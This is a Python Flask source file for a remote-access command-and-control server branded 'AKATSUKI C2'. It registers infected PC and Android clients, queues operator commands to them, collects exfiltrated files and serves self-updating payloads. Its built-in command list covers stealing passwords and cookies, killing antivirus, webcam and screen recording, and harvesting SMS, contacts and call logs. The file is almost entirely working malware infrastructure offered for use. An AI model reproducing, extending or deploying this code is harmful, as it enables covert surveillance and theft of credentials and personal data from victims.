from flask import Flask, request, jsonify, send_from_directory
import threading, time, uuid, logging, os, msvcrt, shutil
from werkzeug.utils import secure_filename
from collections import deque
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.live import Live
from rich.layout import Layout
from rich.text import Text
from rich.markup import escape

# --- SETUP ---
logging.getLogger('werkzeug').setLevel(logging.ERROR)
console = Console()
app = Flask(__name__)

# --- DATA STORES ---
clients = {}
command_queue = {}
_selected_client = None
_current_input = ""
_lock = threading.Lock()
_stop_event = threading.Event()
global_logs = deque(maxlen=10) # Shorter to make room for input

# --- API ENDPOINTS ---
@app.route('/register', methods=['POST'])
def register_client():
    client_id = str(uuid.uuid4())
    os_info = request.json.get('os_info', 'Unknown')
    ip_addr = request.remote_addr
    with _lock:
        clients[client_id] = {'last_seen': time.time(), 'os_info': os_info, 'ip': ip_addr, 'cwd': 'N/A', 'status': 'online'}
    global_logs.append(f"[bold green][+][/] New client: [cyan]{client_id[:8]}[/] ({ip_addr})")
    return jsonify({'client_id': client_id})

@app.route('/heartbeat/<client_id>', methods=['POST'])
def heartbeat(client_id):
    if client_id not in clients:
        return 'Not Found', 404
    with _lock:
        clients[client_id]['last_seen'] = time.time()
        clients[client_id]['cwd'] = request.json.get('cwd', 'N/A')
        tasks = command_queue.pop(client_id, [])
    return jsonify({'tasks': tasks})

@app.route('/report/<client_id>', methods=['POST'])
def report_output(client_id):
    # Output is handled cleanly by Discord Webhook now.
    return 'OK', 200

@app.route('/loot/<client_id>', methods=['POST'])
def receive_loot(client_id):
    if 'file' not in request.files: return 'No file', 400
    file = request.files['file']
    if file.filename == '': return 'No selected file', 400
    
    filename = secure_filename(file.filename)
    os.makedirs('exfiltrated', exist_ok=True)
    save_path = os.path.join('exfiltrated', f"{client_id[:8]}_{filename}")
    file.save(save_path)
    global_logs.append(f"[bold yellow][\u2B07][/] Downloaded from [cyan]{client_id[:8]}[/]: [green]{save_path}[/]")
    return 'OK', 200

@app.route('/serve/<filename>')
def serve_file(filename):
    return send_from_directory('served', filename)

@app.route('/update')
def serve_update():
    """Serve the latest payload script for self-update."""
    # Check for PC payload first, then phone payload
    for payload_name in ['payloads-pc.py', 'payloads-ph.py']:
        if os.path.exists(payload_name):
            with open(payload_name, 'r', encoding='utf-8') as f:
                return f.read(), 200, {'Content-Type': 'text/plain'}
    return 'No payload found', 404

# --- TUI GENERATORS ---
def generate_layout() -> Layout:
    layout = Layout(name="root")
    layout.split(
        Layout(name="header", size=3),
        Layout(name="main", ratio=1),
        Layout(name="footer", size=10),
        Layout(name="cmd_input", size=3), # Dedicated Input Box
    )
    layout["main"].split_row(
        Layout(name="clients", ratio=2),
        Layout(name="help", ratio=1)
    )
    return layout

def generate_client_table() -> Panel:
    table = Table(border_style="magenta", expand=True, box=None)
    table.add_column("Short ID", style="cyan", no_wrap=True)
    table.add_column("OS Info", style="yellow")
    table.add_column("CWD", style="green")
    table.add_column("Status", justify="right")

    with _lock:
        now = time.time()
        active_clients = {cid: data for cid, data in clients.items() if (now - data['last_seen']) < 60}
        
        if not active_clients:
            return Panel(Text("\nWaiting for connections...", justify="center", style="dim yellow"), title="[bold]Active Targets[/]")

        for cid, data in sorted(active_clients.items()):
            diff = int(now - data['last_seen'])
            status = "[green]ONLINE[/]" if diff < 15 else f"[red]{diff}s AGO[/]"
            row_style = "bold reverse cyan" if cid == _selected_client else ""
            table.add_row(
                cid[:8], data.get('os_info', 'N/A')[:20], 
                data.get('cwd', 'N/A')[-30:], status,
                style=row_style
            )
    return Panel(table, title="[bold]Targets[/]", border_style="blue")

def generate_input_panel() -> Panel:
    global _current_input, _selected_client
    target_display = _selected_client[:8] if _selected_client else "NO TARGET"
    prompt = f"[bold red]Fsociety[/]@[bold white]{target_display}[/] > "
    
    # Calculate visible capacity to prevent line wrapping (which causes clipping)
    term_width = console.width
    prompt_len = len(f"Fsociety@{target_display} > ")
    max_len = term_width - prompt_len - 5
    
    display_str = _current_input
    if len(display_str) > max_len and max_len > 0:
        display_str = "..." + display_str[-(max_len-3):]
    
    cursor = "_" if int(time.time() * 2) % 2 == 0 else " "
    content = Text.from_markup(f"{prompt}[white]{escape(display_str)}[/]{cursor}")
    return Panel(content, title="[bold yellow]Command Input[/]", border_style="yellow")

def get_log_panel() -> Panel:
    # Reverse so newest items are at the top and never cut off by the fixed layout
    log_text = "\n".join(reversed(global_logs))
    return Panel(log_text, title="[bold]System Events (Newest Top)[/]", border_style="green")

def get_help_panel() -> Panel:
    help_text = (
        "[bold cyan]Shared:[/] [y]export <f>[/], [y]upload <p>[/], [y]select <id>[/]\n"
        "  [y]geo[/], [y]ss[/], [y]rec_a <sec>[/]\n"
        "[bold magenta]PC Only:[/] [y]wc[/], [y]record <sec> \\[--full][/], [y]rec_v <sec> \\[cam|screen][/]\n"
        "  [red]steal \\[passwords|cookies][/], [y]wifi[/], [y]avkill[/]\n"
        "[bold green]Android Only:[/] [y]wc \\[0|1][/], [y]battery[/], [y]sms \\[N][/], [y]contacts[/]\n"
        "  [y]clipboard[/], [y]callog \\[N][/], [y]vibrate \\[ms][/], [y]toast <msg>[/]\n"
        "[bold yellow]C2 System:[/] [y]push_update[/], [red]exit[/]"
    ).replace("[y]", "[yellow]")
    return Panel(help_text, title="[bold]Cheat Sheet[/]", border_style="white")

# --- INTERACTIVE INPUT HANDLER ---
def process_command(cmd_input):
    global _selected_client
    cmd_input = cmd_input.strip()
    if not cmd_input: return

    if cmd_input.lower() in ["exit", "quit"]:
        _stop_event.set()
        return

    if cmd_input.lower().startswith('select '):
        target = cmd_input.split(maxsplit=1)[1].lower() if len(cmd_input.split()) > 1 else ""
        if target in ["none", "clear", ""]:
            _selected_client = None
            global_logs.append("[*] Targeted: [bold white]None[/]")
        else:
            found = False
            with _lock:
                for cid in list(clients.keys()):
                    if cid.startswith(target) or cid == target:
                        _selected_client = cid
                        global_logs.append(f"[*] Targeted: [bold cyan]{cid[:8]}[/]")
                        found = True
                        break
            if not found:
                global_logs.append(f"[bold red][!] Target '{target}' not found.[/]")
    
    elif cmd_input.lower() == 'push_update':
        if not _selected_client:
            global_logs.append("[bold red][!] No target! Use 'select <id>' first.[/]")
            return
        with _lock:
            command_queue.setdefault(_selected_client, []).append({'cmd_id': str(uuid.uuid4())[:4], 'command': 'sys_update'})
        global_logs.append(f"[bold yellow][↻][/] Push update sent to [cyan]{_selected_client[:8]}[/]")

    elif cmd_input.lower().startswith('upl '):
        if not _selected_client:
            global_logs.append("[bold red][!] No target! Use 'select <id>' first.[/]")
            return
        local_path = cmd_input[4:].strip()
        if not os.path.exists(local_path) or not os.path.isfile(local_path):
            global_logs.append(f"[bold red][!] File not found:[/] {local_path}")
            return
        
        filename = secure_filename(os.path.basename(local_path))
        os.makedirs('served', exist_ok=True)
        served_path = os.path.join('served', filename)
        shutil.copy2(local_path, served_path)
        
        with _lock:
            # We convert 'upl <path>' to 'sys_upload <url> <filename>' for the payload to process
            c2_url_base = request.host_url.rstrip('/') if request else "http://0.0.0.0:8080"
            payload_cmd = f"sys_upload {filename}"
            command_queue.setdefault(_selected_client, []).append({'cmd_id': str(uuid.uuid4())[:4], 'command': payload_cmd})
        global_logs.append(f"[bold cyan][\u2B06][/] Staged [green]{filename}[/] for {target_display}...")

    elif _selected_client:
        with _lock:
            command_queue.setdefault(_selected_client, []).append({
                'cmd_id': str(uuid.uuid4())[:4], 
                'command': cmd_input
            })
        global_logs.append(f"[dim][*] Sent '{cmd_input}' to {_selected_client[:8]}[/]")
    else:
        global_logs.append("[bold red][!] No target! Use 'select <id>' first.[/]")

def input_handler():
    global _current_input
    while not _stop_event.is_set():
        if msvcrt.kbhit():
            try:
                char = msvcrt.getwch() # Native Unicode Support (Thai/Emojis work flawlessly)
                # Windows arrow keys/special keys start with \x00 or \xe0
                if char in ['\xe0', '\x00']:
                    msvcrt.getwch() # swallow the next part
                    continue
                
                if char == '\r': # ENTER
                    process_command(_current_input)
                    _current_input = ""
                elif char == '\x08': # BACKSPACE
                    _current_input = _current_input[:-1]
                elif char == '\x03': # CTRL+C
                    _stop_event.set()
                else:
                    _current_input += char
            except Exception:
                pass
        time.sleep(0.01) # Small sleep to avoid CPU spinning

def connection_monitor():
    while not _stop_event.is_set():
        now = time.time()
        with _lock:
            for cid, data in clients.items():
                diff = now - data['last_seen']
                status = data.get('status', 'online')
                if diff >= 15 and status == 'online':
                    data['status'] = 'offline'
                    global_logs.append(f"[bold yellow][!][/] Target [cyan]{cid[:8]}[/] went [bold red]OFFLINE[/].")
                elif diff < 15 and status == 'offline':
                    data['status'] = 'online'
                    global_logs.append(f"[bold green][+][/] Target [cyan]{cid[:8]}[/] is back [bold green]ONLINE[/].")
        time.sleep(1)

# --- MAIN ---
def TUI_main():
    layout = generate_layout()
    layout["header"].update(Panel(Text("A K A T S U K I   C 2", justify="center", style="bold red"), border_style="red"))
    layout["help"].update(get_help_panel())

    input_thread = threading.Thread(target=input_handler, daemon=True)
    input_thread.start()

    monitor_thread = threading.Thread(target=connection_monitor, daemon=True)
    monitor_thread.start()

    with Live(layout, console=console, refresh_per_second=15, screen=True) as live:
        while not _stop_event.is_set():
            layout["clients"].update(generate_client_table())
            layout["footer"].update(get_log_panel())
            layout["cmd_input"].update(generate_input_panel()) # Update the live input box
            time.sleep(0.05)

if __name__ == '__main__':
    api_thread = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080, threaded=True), daemon=True)
    api_thread.start()
    
    try:
        TUI_main()
    except KeyboardInterrupt:
        pass
    
    console.print("\n[bold red][!] C2 Shutdown.[/]")
    os._exit(0)